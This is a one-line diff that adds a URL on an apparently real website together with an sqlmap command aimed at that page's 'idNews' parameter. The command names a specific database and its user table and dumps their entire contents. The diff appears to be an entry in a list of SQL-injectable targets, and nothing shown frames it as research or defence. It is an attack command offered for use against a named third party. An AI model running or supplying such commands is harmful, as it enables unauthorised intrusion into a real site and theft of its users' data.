@@ -1,0 +1,1 @@
+https://www.cljnh.com.br/noticias.php?idNews=23 (GET)  # sqlmap.py -u https://www.cljnh.com.br/noticias.php?idNews=23 -D cljnhcom_db -T TB_USER --dump-all
